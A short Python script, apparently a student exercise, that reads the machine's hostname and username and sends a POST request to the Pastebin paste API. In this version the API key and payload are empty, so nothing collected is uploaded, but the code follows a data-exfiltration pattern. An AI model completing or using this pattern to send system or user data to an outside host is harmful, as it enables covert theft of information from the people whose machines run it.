# 2301887490 - Kimberly Atalya

import socket, getpass, base64, requests

host_name = socket.gethostname()
username = getpass.getuser()

print('Hostname: ' + host_name)
print('Username: ' + username)

data = {
    'api_dev_key': '',
    'api_paste_code': base64.b64encode(b''),
    'api_option': 'paste'
}

url = 'https://pastebin.com/api/api_post.php'

response = requests.post(url, data=data)

print(f'Response: {response.text}')